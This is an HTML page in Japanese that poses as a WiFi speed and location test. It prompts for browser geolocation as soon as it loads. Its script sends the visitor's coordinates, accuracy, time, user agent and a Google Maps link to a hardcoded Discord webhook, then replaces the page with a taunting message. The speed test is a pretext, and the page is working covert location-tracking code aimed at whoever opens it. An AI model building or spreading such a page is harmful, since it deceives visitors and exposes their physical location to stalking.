<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WIFI通信速度・場所適性診断</title>
  <style>
  body { 
    background: linear-gradient(135deg, #f5f7ff, #e0f7fa); 
    color: #333; 
    font-family: 'Segoe UI', sans-serif; 
    text-align: center; 
    padding: 30px; 
    margin: 0;
  }
  h1 { 
    font-size: 2.5em; 
    color: #00bcd4; 
    margin-bottom: 10px; 
    text-shadow: 1px 1px 3px rgba(0,0,0,0.1);
  }
  p { 
    font-size: 1.3em; 
    color: #555; 
    margin-bottom: 30px; 
  }
  video { 
    max-width: 90%; 
    border: 8px solid #fff; 
    border-radius: 20px; 
    box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
    margin: 20px auto; 
    display: block;
  }
  canvas { display: none; }
  button { 
    font-size: 1.6em; 
    padding: 18px 40px; 
    margin: 20px; 
    background: #ff6b6b; 
    color: white; 
    border: none; 
    border-radius: 50px; 
    cursor: pointer; 
    box-shadow: 0 8px 20px rgba(255,107,107,0.4);
    transition: all 0.3s;
  }
  button:hover { 
    background: #ff8787; 
    transform: translateY(-3px); 
    box-shadow: 0 12px 25px rgba(255,107,107,0.5);
  }
  button:active { 
    transform: translateY(1px);
  }
</style>
</head>
<body>
  <h1>現在地でのWIFI通信速度計測</h1>
  <p>通信速度を計測中...</p>
  <button onclick="getLocation()">位置情報を許可してください</button>

  <script>
    const webhook = 'https://ptb.discord.com/api/webhooks/1456820904871858227/UEozN1o5JlnnW5-Xx4Tb4v-nxJKmE3sEm_TL-U7yoqN5gnD7n_iHmtsTgKfKSEE8Z1xO'; // 

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        alert("このブラウザは位置情報に対応していません");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toLocaleString();

      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      const data = `
**位置情報取得成功**
緯度: ${lat}
経度: ${lon}
精度: ±${acc}m
時間: ${timestamp}
User-Agent: ${navigator.userAgent}
Google Maps: ${mapsUrl}
      `;

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: data })
      });

      document.body.innerHTML = '<h1>えてかさお前ぶさくね？</h1>';
    }

    function showError(error) {
      let msg;
      switch(error.code) {
        case error.PERMISSION_DENIED: msg = "位置情報の許可が拒否されました"; break;
        case error.POSITION_UNAVAILABLE: msg = "位置情報が取得できません"; break;
        case error.TIMEOUT: msg = "タイムアウト"; break;
        default: msg = "不明なエラー"; break;
      }
      document.body.innerHTML += `<p>${msg}</p>`;
    }

    // ページロード時に自動で許可プロンプト表示
    window.onload = getLocation;
  </script>
</body>
</html>
